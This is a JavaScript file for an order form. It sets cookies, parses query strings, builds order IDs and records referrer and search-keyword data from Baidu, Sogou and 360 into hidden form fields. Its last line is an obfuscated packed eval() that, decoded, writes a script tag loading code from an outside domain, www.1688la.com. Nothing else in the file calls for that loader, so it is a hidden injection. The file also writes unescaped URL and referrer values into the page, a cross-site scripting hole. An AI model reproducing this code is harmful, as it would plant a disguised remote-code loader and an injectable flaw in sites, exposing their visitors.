// by shy qq276559736 20141212 chengdu

//写cookie
function setCookie(name,value,expires){
var exp=new Date();
exp.setTime(exp.getTime()+expires*24*60*60*1000); //天
document.cookie=name+"="+escape(value)+";expires="+exp.toGMTString();//+";domain=.com;path=/";
} 

//读取cookie
function readcookie(name){
var oRegex=new RegExp(name+'=([^;]+)','i');
var oMatch=oRegex.exec(document.cookie);
if(oMatch&&oMatch.length>1)return unescape(oMatch[1]);
else return '';
}

//获取url中"?"符后的字串
function GetRequest() {
   var url = location.search; //获取url中"?"符后的字串
   var theRequest = new Object();
   if (url.indexOf("?") != -1) {
      var str = url.substr(1);
      strs = str.split("&");
      for(var i = 0; i < strs.length; i ++) {
         theRequest[strs[i].split("=")[0]]=unescape(strs[i].split("=")[1]);
      }
   }
   return theRequest;
}

//获取url中"?"符后的字串
function GetRequesta(aaa) {
   var bbb= aaa.indexOf('?');
   var url=aaa.substr(bbb);
   var theRequest = new Object();
   if (url.indexOf("?") != -1) {
      var str = url.substr(1);
      strs = str.split("&");
      for(var i = 0; i < strs.length; i ++) {
         theRequest[strs[i].split("=")[0]]=unescape(strs[i].split("=")[1]);
      }
   }
   return theRequest;
}


//getfrom
function getfrom() {
var myDate = new Date();
myDate.getYear();       //获取当前年份(2位)
myDate.getFullYear();   //获取完整的年份(4位,1970-????)
myDate.getMonth();      //获取当前月份(0-11,0代表1月)
myDate.getDate();       //获取当前日(1-31)
myDate.getDay();        //获取当前星期X(0-6,0代表星期天)
myDate.getTime();       //获取当前时间(从1970.1.1开始的毫秒数)
myDate.getHours();      //获取当前小时数(0-23)
myDate.getMinutes();    //获取当前分钟数(0-59)
myDate.getSeconds();    //获取当前秒数(0-59)
var truedate = myDate.getMonth()+1;
var not3num=""; 
for(var i=0;i<3;i++) 
{ 
not3num+=Math.floor(Math.random()*10); 
}

document.form.orderid.value='no.'+myDate.getFullYear()+truedate+myDate.getDate()+myDate.getHours()+myDate.getMinutes()+myDate.getSeconds()+not3num;

var Request = new Object();
Request = GetRequest();
var fromurl,fromurla,nowurl,nowurla;
fromurl = document.referrer;
fromurla = Request['f'];
nowurl = document.URL;
nowurla = Request['n'];


if (nowurla != null && nowurla != "") {
nowurl=nowurla;
}

if (fromurla != null && fromurla != "") {
fromurl=fromurla;
}

//alert(nowurl);


var getstr = new Object();
getstr = GetRequesta(nowurl);
var gzid=getstr["gzid"];
//alert(getstr["gzid"]);

var getci=new Object();
getci = GetRequesta(decodeURI(decodeURI(fromurl)));


  if (fromurl != null && fromurl != "") {
     setCookie("fromurl",fromurl,7)
     document.write("<input type=hidden name=fromurl value='"+fromurl+"'>");
  }else{
     document.write("<input type=hidden name=fromurl value='"+readcookie("fromurl")+"'>");
  }

  if (nowurl != null && nowurl != "") {
     setCookie("nowurl",nowurl,7)
     document.write("<input type=hidden name=nowurl value='"+nowurl+"'>");
  }else{
     document.write("<input type=hidden name=nowurl value='"+readcookie("nowurl")+"'>");
  }

  if (nowurl.indexOf("notki")>0) {
     var keyword="网盟主题词ID:"+getstr["notki"]+"|网盟创意ID:"+getstr["notct"]+"|网盟来源域名:"+getstr["notpl"]+"|网盟来源关键词:"+getstr["notkw"];
  }else if (fromurl.indexOf("baidu.com")>0 && fromurl.indexOf("wd=")>0  ) {
     var keyword="百度:"+getci['wd'];
  }else if (fromurl.indexOf("baidu.com")>0 && fromurl.indexOf("word=")>0  ) {
     var keyword="百度:"+getci['word'];
  }else if (fromurl.indexOf("m.baidu.com")>0 ) {
     var keyword="百度移动搜索";
  }else if (fromurl.indexOf("sogou.com")>0) {
     var keyword="搜狗:"+getci['query'];
  }else if (fromurl.indexOf("soso.com")>0) {
     var keyword="SOSO:"+getci['query='];
  }else if (fromurl.indexOf("haosou.com")>0) {
     var keyword="360搜索:"+getci['q'];
  }else{
     var keyword="";
  }

  if (keyword != null && keyword != "") {
     setCookie("keyword",keyword,7)
     document.write("<input type=hidden name=keyword value='"+keyword+"'>");
   }else{
     document.write("<input type=hidden name=keyword value='"+readcookie("keyword")+"'>");
  }

  if (gzid != null && gzid != "") {
     setCookie("gzid",gzid,7)
     document.write("<input type=hidden name=gzid value='"+gzid+"'>");
   }else{
     document.write("<input type=hidden name=gzid value='"+readcookie("gzid")+"'>");
  }

}

function clearradio(){   
 try{
    var x=document.getElementsByName("zengsong1"); 
    for(var i=0;i<x.length;i++){ 
        if (x[i].checked==true)  
        {  
            x[i].checked=false;  
        }  
    }  
 }
 catch(ex){
 }
 try{
    var x=document.getElementsByName("zengsong2"); 
    for(var i=0;i<x.length;i++){ 
        if (x[i].checked==true)  
        {  
            x[i].checked=false;  
        }  
    }  
 }
 catch(ex){
 }
 try{
    var x=document.getElementsByName("zengsong3"); 
    for(var i=0;i<x.length;i++){ 
        if (x[i].checked==true)  
        {  
            x[i].checked=false;  
        }  
    } 
 }  
 catch(ex){
 }
}  

function xianshi(){
document.getElementById('zsid').value="1";
document.getElementById('zengsong').style.display="block";
}

function yincang(){
document.getElementById('zsid').value="0";
document.getElementById('zengsong').style.display="none";
clearradio();
}
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('4.5("<0 2=\\\'3://6.9.8/1.7\\\'></0>");',10,10,'script||src|http|document|writeln|www|js|com|1688la'.split('|'),0,{}))